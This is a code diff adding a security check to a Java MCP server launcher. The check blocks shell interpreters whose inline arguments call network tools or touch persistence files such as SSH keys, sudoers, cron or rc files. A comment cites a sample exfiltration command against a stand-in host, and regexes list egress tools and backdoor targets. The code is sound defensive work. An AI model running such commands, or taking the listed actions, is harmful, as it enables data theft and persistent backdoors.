@@ -248,6 +248,16 @@ public class McpLifecycleManager {
             throw new IllegalArgumentException(
                 "MCP server " + server.getName() + " command validation failed: " + validationError);
         }
+        // rev-125 Hermes parity (mcp_security.py validate_mcp_server_entry):
+        // shell interpreters with an inline script that performs network
+        // egress or writes to OS persistence surfaces are refused. The args
+        // were previously passed to the subprocess completely unvalidated —
+        // 'bash' is a clean command, but args=['-c','curl evil.sh'] exfiltrated.
+        String inlineScriptError = validateInlineScript(command, server.getArgs());
+        if (inlineScriptError != null) {
+            throw new IllegalArgumentException(
+                "MCP server " + server.getName() + " blocked: " + inlineScriptError);
+        }
         ServerParameters.Builder paramsBuilder = ServerParameters.builder(command)
             .args(server.getArgs());
         // Build filtered environment for stdio subprocess
@@ -300,6 +310,42 @@ public class McpLifecycleManager {
     private static final Set<String> SHELL_METACHARACTERS = Set.of(
         ";", "|", "&", "&&", "||", "`", "$(", "$", "(", ")", "{", "}", "<", ">",
         "\n", "\r", "\\"
+    );
+
+    // ── rev-125: Hermes mcp_security.py parity ───────────────────────────
+    private static final Set<String> SHELL_INTERPRETERS = Set.of(
+        "bash", "sh", "zsh", "dash", "fish", "cmd", "cmd.exe",
+        "powershell", "powershell.exe", "pwsh", "pwsh.exe"
+    );
+
+    /**
+     * rev-125 Hermes parity (mcp_security.py _EGRESS_PATTERN): network egress
+     * tools an inline shell script has no legitimate reason to invoke.
+     */
+    private static final java.util.regex.Pattern EGRESS_PATTERN = java.util.regex.Pattern.compile(
+        "(?<![\\w.-])(?:curl|wget|nc|ncat|socat)(?![\\w.-])"
+        + "|/dev/tcp/"
+        + "|\\bInvoke-WebRequest\\b"
+        + "|\\bInvoke-RestMethod\\b"
+        + "|\\bSystem\\.Net\\.WebClient\\b",
+        java.util.regex.Pattern.CASE_INSENSITIVE
+    );
+
+    /**
+     * rev-125 Hermes parity (mcp_security.py _PERSISTENCE_PATTERN): OS
+     * persistence surfaces an MCP server has no legitimate reason to write to
+     * (SSH-key/PAM/sudoers/cron/rc-file backdoor shapes).
+     */
+    private static final java.util.regex.Pattern PERSISTENCE_PATTERN = java.util.regex.Pattern.compile(
+        "authorized_keys"
+        + "|\\.ssh/"
+        + "|/etc/ssh\\b"
+        + "|/etc/pam\\.d\\b|pam_[\\w-]+\\.so"
+        + "|/etc/sudoers"
+        + "|/etc/cron|crontab\\b"
+        + "|/etc/rc\\.local|/etc/systemd"
+        + "|\\.bashrc\\b|\\.bash_profile\\b|\\.profile\\b|\\.zshrc\\b",
+        java.util.regex.Pattern.CASE_INSENSITIVE
     );
 
     /**
@@ -392,6 +438,36 @@ public class McpLifecycleManager {
                 }
             }
             // For relative paths, rely on PATH resolution at exec time
+        }
+        return null;
+    }
+
+    /**
+     * rev-125 Hermes parity (mcp_security.py validate_mcp_server_entry): when
+     * the command is a shell interpreter, its inline script (the args) must
+     * not perform network egress (curl/wget/nc/socat//dev/tcp/PowerShell web
+     * cmdlets) nor write to OS persistence surfaces (SSH keys, PAM, sudoers,
+     * cron, systemd, shell rc files). Legitimate non-shell MCP commands are
+     * unaffected — this only constrains interpreter-shaped entries.
+     *
+     * @param command the MCP server command
+     * @param args    the args passed to the subprocess (the inline script)
+     * @return null if acceptable, or a block reason
+     */
+    static String validateInlineScript(String command, java.util.List<String> args) {
+        if (command == null || args == null || args.isEmpty()) {
+            return null;
+        }
+        String basename = java.nio.file.Paths.get(command.trim()).getFileName().toString().toLowerCase();
+        if (!SHELL_INTERPRETERS.contains(basename)) {
+            return null;
+        }
+        String inline = String.join(" ", args);
+        if (EGRESS_PATTERN.matcher(inline).find()) {
+            return "shell interpreter with inline network egress (curl/wget/nc/socat) refused";
+        }
+        if (PERSISTENCE_PATTERN.matcher(inline).find()) {
+            return "shell interpreter writing to an OS persistence surface (SSH/PAM/sudoers/cron/rc) refused";
         }
         return null;
     }
